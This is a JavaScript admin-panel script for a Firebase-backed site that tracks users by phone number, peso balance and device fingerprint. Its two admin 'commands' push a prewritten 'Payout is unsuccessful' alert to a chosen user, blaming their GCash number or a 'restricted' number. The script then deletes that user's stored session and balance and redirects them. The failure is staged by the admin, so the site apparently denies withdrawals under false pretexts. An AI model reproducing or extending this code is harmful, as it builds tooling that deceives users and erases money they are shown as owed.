/**
 * ADCOM.JS - Admin Command Center (DEBUG VERSION)
 * May on-screen messages para sa mobile testing
 */

// ========== DETECT CURRENT PAGE ==========
const isAdminPage = window.location.pathname.includes('admin') || 
                    window.location.pathname.includes('admin_12820') ||
                    document.querySelector('.cia-header') !== null;

// ========== VISUAL DEBUG FUNCTION (para sa mobile) ==========
function showDebugMessage(message, type = 'info') {
    const colors = {
        info: '#00f2ff',
        success: '#39ff14',
        error: '#ff4444',
        warning: '#ffaa00'
    };
    
    const debugDiv = document.createElement('div');
    debugDiv.style.cssText = `
        position: fixed;
        bottom: 10px;
        left: 10px;
        right: 10px;
        background: #0a0f2a;
        color: ${colors[type] || colors.info};
        padding: 12px;
        border-radius: 12px;
        z-index: 999999;
        font-size: 12px;
        text-align: center;
        border: 2px solid ${colors[type] || colors.info};
        font-family: monospace;
        font-weight: bold;
        box-shadow: 0 0 10px rgba(0,0,0,0.5);
    `;
    debugDiv.innerHTML = `
        ${message}
        <button onclick="this.parentElement.remove()" style="
            background: ${colors[type] || colors.info};
            color: #000;
            border: none;
            border-radius: 8px;
            padding: 4px 12px;
            margin-left: 10px;
            font-weight: bold;
            cursor: pointer;
        ">OK</button>
    `;
    document.body.appendChild(debugDiv);
    
    // Auto remove after 8 seconds
    setTimeout(() => {
        if (debugDiv && debugDiv.remove) debugDiv.remove();
    }, 8000);
    
    // Also log to console if available
    console.log(`[${type.toUpperCase()}] ${message}`);
}

// ========== INJECT CSS (ADMIN PAGE ONLY) ==========
if (isAdminPage) {
    (function injectStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .admin-command-popup {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.96);
                backdrop-filter: blur(16px);
                z-index: 9999999;
                display: none;
                align-items: center;
                justify-content: center;
            }
            .admin-command-popup-content {
                width: 90%;
                max-width: 500px;
                max-height: 85vh;
                background: linear-gradient(145deg, #0f0f1a, #1a1a2e);
                border: 2px solid #00f2ff;
                border-radius: 20px;
                overflow: hidden;
                display: flex;
                flex-direction: column;
                animation: popupSlideIn 0.3s ease;
            }
            @keyframes popupSlideIn {
                from { opacity: 0; transform: scale(0.9) translateY(-20px); }
                to { opacity: 1; transform: scale(1) translateY(0); }
            }
            .admin-command-popup-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 20px;
                background: rgba(0, 242, 255, 0.1);
                border-bottom: 1px solid rgba(0, 242, 255, 0.3);
            }
            .admin-command-popup-header h3 {
                color: #00f2ff;
                margin: 0;
                font-size: 16px;
                font-family: monospace;
            }
            .close-popup {
                background: rgba(255, 255, 255, 0.1);
                border: none;
                color: #fff;
                font-size: 18px;
                width: 30px;
                height: 30px;
                border-radius: 50%;
                cursor: pointer;
            }
            .user-info-section { padding: 15px 20px; background: rgba(0,0,0,0.3); border-bottom: 1px solid rgba(255,255,255,0.1); }
            .info-row { display: flex; margin-bottom: 10px; font-size: 12px; }
            .info-label { width: 130px; color: #888; }
            .info-value { flex: 1; color: #fff; word-break: break-all; }
            .device-fp { font-family: monospace; font-size: 10px; color: #39ff14; }
            .related-numbers-section { padding: 15px 20px; border-bottom: 1px solid rgba(255,255,255,0.1); }
            .section-title { font-size: 11px; color: #00f2ff; margin-bottom: 10px; font-weight: bold; }
            .related-list { max-height: 150px; overflow-y: auto; }
            .related-item { display: flex; justify-content: space-between; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px; }
            .related-phone { color: #ffd700; }
            .related-balance { color: #39ff14; }
            .no-related { padding: 15px 20px; color: #666; font-size: 11px; text-align: center; }
            .command-buttons-section { padding: 15px 20px; }
            .command-buttons-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 10px; }
            .command-btn { padding: 12px; border: none; border-radius: 12px; font-size: 13px; font-weight: bold; cursor: pointer; }
            .command-1 { background: linear-gradient(135deg, #ff9800, #ff5722); color: white; }
            .command-2 { background: linear-gradient(135deg, #2196f3, #0d47a1); color: white; }
            .admin-command-popup-footer { padding: 12px 20px; background: rgba(255,68,68,0.1); border-top: 1px solid rgba(255,68,68,0.3); text-align: center; }
            .warning-text { font-size: 10px; color: #ff8888; }
            .clickable-phone { cursor: pointer; color: #00f2ff; text-decoration: underline; }
            @media (max-width: 768px) {
                .command-buttons-grid { grid-template-columns: 1fr; gap: 8px; }
                .info-label { width: 100px; font-size: 10px; }
            }
        `;
        document.head.appendChild(style);
    })();
}

// ========== SHOW USER DETAILS POPUP (ADMIN ONLY) ==========
async function showUserDetailsPopup(phone) {
    if (!isAdminPage) return;
    
    showDebugMessage(`Loading user data for: ${phone}`, 'info');
    
    const userSnapshot = await db.ref('user_sessions/' + phone).once('value');
    const userData = userSnapshot.val();
    
    if (!userData) {
        showDebugMessage(`User ${phone} not found!`, 'error');
        alert('User data not found');
        return;
    }
    
    const deviceFingerprint = userData.deviceFingerprint || 'Unknown';
    
    const relatedNumbers = [];
    const allUsersSnapshot = await db.ref('user_sessions').once('value');
    const allUsers = allUsersSnapshot.val() || {};
    
    for (const [userPhone, userInfo] of Object.entries(allUsers)) {
        if (userInfo.deviceFingerprint === deviceFingerprint && userPhone !== phone) {
            relatedNumbers.push({ phone: userPhone, balance: userInfo.balance || 0 });
        }
    }
    
    const lastSeen = userData.lastUpdate ? new Date(userData.lastUpdate).toLocaleString() : 'Never';
    const balance = (userData.balance || 0).toFixed(2);
    
    const popupHTML = `
        <div id="userCommandPopup" class="admin-command-popup" style="display: flex;">
            <div class="admin-command-popup-content">
                <div class="admin-command-popup-header">
                    <h3>👤 USER DETAILS</h3>
                    <button class="close-popup" onclick="closeUserCommandPopup()">✕</button>
                </div>
                <div class="user-info-section">
                    <div class="info-row"><span class="info-label">📱 Number:</span><span class="info-value">${phone}</span></div>
                    <div class="info-row"><span class="info-label">💰 Balance:</span><span class="info-value">₱${balance}</span></div>
                    <div class="info-row"><span class="info-label">🕐 Last Seen:</span><span class="info-value">${lastSeen}</span></div>
                    <div class="info-row"><span class="info-label">🔑 Fingerprint:</span><span class="info-value device-fp">${deviceFingerprint}</span></div>
                </div>
                ${relatedNumbers.length > 0 ? `
                <div class="related-numbers-section">
                    <div class="section-title">📌 Related Numbers</div>
                    <div class="related-list">
                        ${relatedNumbers.map(rel => `<div class="related-item"><span class="related-phone">${rel.phone}</span><span class="related-balance">₱${rel.balance}</span></div>`).join('')}
                    </div>
                </div>` : '<div class="no-related">No other numbers found</div>'}
                <div class="command-buttons-section">
                    <div class="section-title">⚡ SEND COMMAND</div>
                    <div class="command-buttons-grid">
                        <button class="command-btn command-1" onclick="sendCommandToUser('${phone}', '1')">📧 COMMAND #1</button>
                        <button class="command-btn command-2" onclick="sendCommandToUser('${phone}', '2')">📞 COMMAND #2</button>
                    </div>
                </div>
                <div class="admin-command-popup-footer"><span class="warning-text">⚠️ Command will reset user data</span></div>
            </div>
        </div>
    `;
    
    const existingPopup = document.getElementById('userCommandPopup');
    if (existingPopup) existingPopup.remove();
    document.body.insertAdjacentHTML('beforeend', popupHTML);
}

function closeUserCommandPopup() {
    const popup = document.getElementById('userCommandPopup');
    if (popup) popup.remove();
}

// ========== SEND COMMAND TO USER ==========
async function sendCommandToUser(phone, commandCode) {
    if (!isAdminPage) return;
    
    closeUserCommandPopup();
    
    const commandMessages = {
        '1': 'Clear user data and require registered GCash number?',
        '2': 'Clear user data due to restricted number?'
    };
    
    if (!confirm(`⚠️ WARNING\n\n${commandMessages[commandCode]}\n\nUser: ${phone}\n\nThis action CANNOT be undone!`)) {
        return;
    }
    
    const commandRef = db.ref('admin_commands/' + phone);
    const timestamp = Date.now();
    
    let message = '';
    if (commandCode === '1') {
        message = '⚠️ Payout is unsuccessful. Please use your registered GCash number to complete your withdrawal.';
    } else if (commandCode === '2') {
        message = '⚠️ Payout is unsuccessful. Your mobile number is restricted. Please use another registered mobile number to verify your withdrawal.';
    }
    
    await commandRef.set({
        message: message,
        action: 'clear_and_reset',
        commandCode: commandCode,
        phone: phone,
        timestamp: timestamp,
        status: 'pending'
    });
    
    showDebugMessage(`✅ Command sent to ${phone}`, 'success');
    
    setTimeout(async () => {
        const cmdSnapshot = await commandRef.once('value');
        if (cmdSnapshot.exists() && cmdSnapshot.val().status === 'pending') {
            await commandRef.remove();
            showDebugMessage(`⚠️ Command timeout for ${phone} (not received)`, 'warning');
        }
    }, 30000);
}

// ========== MAKE PHONE NUMBERS CLICKABLE (ADMIN ONLY) ==========
function makePhonesClickable() {
    if (!isAdminPage) return;
    
    showDebugMessage('Making phone numbers clickable...', 'info');
    
    const allCells = document.querySelectorAll('#ghostData td');
    let foundPhones = 0;
    
    allCells.forEach(cell => {
        const text = cell.innerText.trim();
        if (text.match(/^09\d{9}$/)) {
            foundPhones++;
            if (!cell.hasAttribute('data-clickable')) {
                cell.setAttribute('data-clickable', 'true');
                cell.style.cursor = 'pointer';
                cell.style.color = '#00f2ff';
                cell.style.textDecoration = 'underline';
                cell.style.fontWeight = 'bold';
                cell.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const phone = this.innerText.trim();
                    showDebugMessage(`Phone clicked: ${phone}`, 'info');
                    showUserDetailsPopup(phone);
                });
            }
        }
    });
    
    if (foundPhones > 0) {
        showDebugMessage(`Found ${foundPhones} phone number(s) - Clickable now!`, 'success');
    } else {
        showDebugMessage('No phone numbers found in table', 'warning');
    }
}

function observeTableChanges() {
    if (!isAdminPage) return;
    
    const observer = new MutationObserver(() => {
        makePhonesClickable();
    });
    
    const targetNode = document.getElementById('ghostData');
    if (targetNode) {
        observer.observe(targetNode, { childList: true, subtree: true });
    }
    
    makePhonesClickable();
}

// ========== USER SIDE: LISTEN FOR COMMANDS ==========
function listenForAdminCommands() {
    showDebugMessage('🔵 Starting command listener...', 'info');
    
    const userPhone = localStorage.getItem('userPhone');
    showDebugMessage(`🔵 User phone from storage: ${userPhone || 'NOT FOUND'}`, userPhone ? 'info' : 'error');
    
    if (!userPhone) {
        showDebugMessage('❌ No user phone found! Please login first.', 'error');
        return;
    }
    
    showDebugMessage(`✅ Listening for admin commands as: ${userPhone}`, 'success');
    
    const commandRef = db.ref('admin_commands/' + userPhone);
    
    commandRef.on('value', async (snapshot) => {
        const command = snapshot.val();
        
        if (command && command.status === 'pending') {
            showDebugMessage(`📩 COMMAND RECEIVED! Type: ${command.commandCode}`, 'warning');
            
            // Show alert to user
            alert(command.message);
            showDebugMessage(`📢 Alert shown to user`, 'success');
            
            // Mark as received
            await commandRef.update({ status: 'received' });
            showDebugMessage(`✅ Command marked as received`, 'success');
            
            // Clear user data
            localStorage.removeItem('userPhone');
            localStorage.removeItem('userDeviceId');
            localStorage.removeItem('userSession');
            showDebugMessage(`🗑️ Local storage cleared`, 'info');
            
            // Delete from Firebase
            await db.ref('user_sessions/' + userPhone).remove();
            showDebugMessage(`🗑️ User session deleted from Firebase`, 'info');
            
            // Redirect
            showDebugMessage(`🔄 Redirecting to index.html...`, 'warning');
            window.location.href = 'index.html';
        }
    });
    
    showDebugMessage(`🎧 Listener active! Waiting for admin command...`, 'success');
}

// ========== INITIALIZE ==========
function initAdcom() {
    const pageType = isAdminPage ? 'ADMIN' : 'USER';
    showDebugMessage(`ADCOM initialized - Page: ${pageType}`, 'success');
    
    if (isAdminPage) {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(observeTableChanges, 1500);
            });
        } else {
            setTimeout(observeTableChanges, 1500);
        }
    } else {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(listenForAdminCommands, 1500);
            });
        } else {
            setTimeout(listenForAdminCommands, 1500);
        }
    }
}

// Start ADCOM
initAdcom();
